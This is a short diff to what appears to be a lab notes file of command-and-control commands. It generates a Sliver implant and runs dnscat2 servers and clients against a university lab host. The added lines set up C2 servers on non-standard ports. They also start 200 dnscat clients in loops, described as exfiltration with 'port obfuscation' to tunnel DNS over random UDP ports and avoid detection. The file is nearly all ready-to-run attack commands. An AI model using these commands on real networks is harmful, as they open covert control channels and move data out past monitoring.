@@ -22,8 +22,12 @@ generate --dns sliver.pole.io.  --debug --os linux  --save /tmp/bleed
 sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,domain=dnscat.strive.io'
 ./dnscat --secret= dnscat.strives.io
 
-sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io'
-./dnscat --dns server=cssvlab06.uwb.edu,port=143,domain=dnscat.strive.io --secret=
 
+# example c2 server 
+sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=143,domain=dnscat.stereo.io'
+sudo ruby dnscat2.rb --dns 'host=cssvlab06.uwb.edu,port=25565,domain=dnscat.sensor.live'
 
-
+# exfiltration overlay UDP port with port obfuscation 
+# DNS protocol layered on top of random UDP ports except (53, 5353,5355)
+for i in {1..200}; do ./dnscat --dns server=cssvlab06.uwb.edu,port=143,domain=dnscat.stereo.io --secret= & done;
+for i in {1..200}; do ./dnscat --dns server=cssvlab06.uwb.edu,port=25565,domain=dnscat.sensor.live --secret= & done;
